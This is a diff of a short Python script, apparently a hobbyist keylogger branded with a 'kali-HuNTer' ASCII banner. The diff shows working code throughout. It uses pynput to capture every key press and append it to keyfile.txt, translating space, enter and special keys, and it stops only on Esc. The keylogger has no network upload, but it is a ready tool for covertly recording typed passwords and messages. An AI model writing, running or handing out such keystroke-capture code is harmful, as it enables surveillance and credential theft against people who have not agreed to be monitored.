@@ -1,26 +1,21 @@
 import pyfiglet
 from termcolor import colored
-
-# Text to convert to ASCII art
-text = "vivek"
-
-
-# Specify font
-font = "big"
-
-# Generate ASCII art with specified font
-ascii_art = pyfiglet.figlet_format(text, font=font)
-
-# Color the ASCII art
-colored_ascii_art = colored(ascii_art, color='green')
-
-# Print the colored ASCII art
-print(colored_ascii_art)
-
-#keylogger in python 
-
 from pynput import keyboard
 
+# Function to print ASCII art in blue
+def print_ascii_art():
+    # Define the text and the font
+    text = "kali-HuNTer"
+    font = "speed"
+
+    # Generate ASCII art text
+    ascii_art = pyfiglet.figlet_format(text, font=font)
+
+    # Print the ASCII art text in blue color
+    print(colored(ascii_art, 'blue'))
+    print("Author : Vivek Kumar")
+
+# Function to log key presses
 def keypressed(key):
     print(str(key))
     with open("keyfile.txt", 'a') as logKey:
@@ -28,9 +23,20 @@ def keypressed(key):
             char = key.char
             logKey.write(char)
         except AttributeError:
-            print("error getting char")
+            if key == keyboard.Key.space:
+                logKey.write(' ')
+            elif key == keyboard.Key.enter:
+                logKey.write('\n')
+            elif key == keyboard.Key.esc:
+                # Stop listener
+                return False
+            else:
+                logKey.write(f'[{key}]')
 
+# Main function
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keypressed)
-    listener.start()
-    listener.join()  # This keeps the listener running until you stop it explicitly
+    print_ascii_art()
+
+    # Set up the key listener
+    with keyboard.Listener(on_press=keypressed) as listener:
+        listener.join()  # This keeps the listener running until you stop it explicitly
